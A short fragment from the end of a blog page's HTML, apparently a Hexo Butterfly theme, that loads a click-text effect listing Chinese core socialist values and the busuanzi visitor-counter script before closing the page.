</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="富强,明主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>